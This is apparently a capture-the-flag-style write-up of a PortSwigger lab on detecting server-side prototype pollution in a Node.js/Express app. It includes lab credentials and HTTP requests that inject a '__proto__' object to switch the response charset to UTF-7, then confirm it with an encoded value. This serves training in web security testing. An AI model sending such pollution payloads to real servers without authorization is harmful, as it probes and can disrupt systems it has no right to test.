
# Detecting server-side prototype pollution without polluted property reflection

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.

You can log in to your own account with the following credentials: wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.


---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/server-side









![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/1.png)
![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/2.png)
![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/3.png)
![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/4.png)

---------------------------------------------


It is possible to update the charset:

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0","__proto__":{"content-type": "application/json; charset=utf-7"}}
```



![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/5.png)



Now the value "+AGYAbwBv-" is interpreted as “foo”:

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"+AGYAbwBv-","address_line_2":"+AGYAbwBv-","city":"+AGYAbwBv-","postcode":"+AGYAbwBv-","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0"}
```



![img](images/Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection/6.png)